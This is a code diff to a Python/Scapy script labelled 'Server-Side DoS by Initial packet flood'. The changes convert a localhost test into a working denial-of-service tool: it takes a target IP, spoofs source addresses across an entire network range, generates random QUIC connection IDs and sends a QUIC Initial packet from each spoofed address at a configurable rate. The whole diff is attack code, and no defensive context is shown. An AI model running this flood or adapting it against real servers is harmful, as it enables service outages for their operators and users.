@@ -12,7 +12,8 @@ import time
 import argparse
 import logging
 import re
-from ipaddress import IPv4Network
+from ipaddress import IPv4Address, IPv4Network
+import secrets
 
 # I know this could be shorter, but the verbosity is intended.
 # The first group give the network base IP, the second the network subnet.
@@ -24,17 +25,31 @@ if __name__ == "__main__":
         description='Server-Side DoS by Initial packet flood'
     )
     parser.add_argument(
+        '-t',
+        '--target',
+        type=str,
+        required=True,
+        help='destination IP used'
+    )
+    parser.add_argument(
         '-n',
         '--nclient',
         type=int,
-        nargs=1,
-        default=100,
+        default=254,
         help='number of spoofed client'
+    )
+    parser.add_argument(
+        '-d',
+        '--delay',
+        type=int,
+        default=20,
+        help='Time in milliseconds to wait before next packet'
     )
     parser.add_argument(
         '-sport',
         "--src-port",
         type=int,
+        default=60060, #Random chosen port
         help="source port",
     )
     parser.add_argument(
@@ -75,22 +90,22 @@ if __name__ == "__main__":
     #subnet_bits = network_cidr.group(2)
     
     network = IPv4Network(args.network)
-    
+    target = IPv4Address(args.target)
+    delay = args.delay/1000
     logging.info(f"network: {network.network_address}")
     logging.info(f"subnet: {network.netmask}")
+    
+    for ip in network:
+        src_ip = str(ip) # spoofed source IP address
+        dst_ip =  args.target # destination IP address
 
-    for x in range(50,51):
-        src_ip = '127.0.0.1' # spoofed source IP address
-        dst_ip = '127.0.0.1' # destination IP address
-        src_ip = '::1'
-        dst_ip = '::1'
-        src_port = 10000 # source port
-        dst_port = 60000 # destination port
+        src_port = args.src_port # source port
+        dst_port = args.dst_port # destination port
         
-        DCID = bytes.fromhex("4949b5218e99c022")
-        SCID = bytes.fromhex("78643036af1314e2")
+        DCID = bytes.fromhex(secrets.token_hex(16))
+        SCID = bytes.fromhex(secrets.token_hex(16))
 
-        ip_packet = IPv6(src=src_ip, dst=dst_ip)
+        ip_packet = IP(src=src_ip, dst=dst_ip)
         udp_packet = UDP(sport=src_port, dport=dst_port)
         
         quic_packet = QUIC.initial(DCID,SCID)
@@ -98,5 +113,5 @@ if __name__ == "__main__":
         spoofed_packet = ip_packet / udp_packet / quic_packet
         
         send(spoofed_packet)
-        #time.sleep(0.01)
+        time.sleep(delay)
     
